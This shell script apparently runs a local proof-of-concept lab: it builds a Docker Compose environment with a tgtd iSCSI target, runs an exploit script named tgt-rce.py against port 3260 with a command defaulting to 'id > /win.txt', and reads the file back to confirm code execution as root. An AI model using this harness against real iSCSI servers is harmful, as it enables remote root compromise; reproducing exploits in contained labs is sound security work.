#!/bin/sh
set -e
cd "$(dirname "$0")"

trap 'docker compose down -v >/dev/null 2>&1 || true' EXIT

docker compose down -v >/dev/null 2>&1 || true
docker compose up -d --build

i=0
while [ $i -lt 60 ]; do
	if docker compose logs target 2>&1 | grep -q "tgtd ready"; then
		break
	fi
	i=$((i + 1))
	sleep 1
done
sleep 1

CMD=${CMD:-id > /win.txt}
python3 exp/tgt-rce.py 127.0.0.1 3260 "$CMD"

echo "--- /win.txt (written by tgtd running as root in the target) ---"
docker compose exec -T target cat /win.txt
